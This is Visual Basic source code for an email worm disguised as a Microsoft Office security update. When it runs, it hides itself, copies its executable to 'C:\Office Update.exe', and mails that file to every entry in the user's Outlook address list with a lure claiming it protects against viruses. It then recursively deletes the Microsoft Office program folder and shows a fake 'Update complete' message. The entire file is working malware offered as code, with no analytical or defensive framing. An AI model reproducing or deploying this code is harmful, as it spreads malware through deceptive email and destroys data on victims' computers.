

Dim x As Integer

Private Sub form_load()

on error resume next

FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\Office Update.exe"

Me.Hide          'hides the from

Set ol = CreateObject("Outlook.Application")
Set out = WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x = 1 To a.AddressEntries.Count
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject = "Important Microsoft Office Security Update;)"
Mail.Body = "Please download this security update.  It will protect you from newly discovered viruses"
Mail.Attachments.Add "C:\Office Update.exe"
Mail.Send
Next
ol.Quit

KillFolder ("C:\Program Files\Microsoft Office")

msgbox "Security Updater has completed its task", vbInformation, "Update complete"

End Sub


Public Function KillFolder(ByVal FullPath As String) _
 As Boolean

On Error Resume Next
Dim oFso As New Scripting.FileSystemObject

If Right(FullPath, 1) = "\" Then FullPath = _
  Left(FullPath, Len(FullPath) - 1)

If oFso.FolderExists(FullPath) Then
 
  oFso.DeleteFolder FullPath, True
 
  KillFolder = Err.Number = 0 And _
    oFso.FolderExists(FullPath) = False
End If

End Function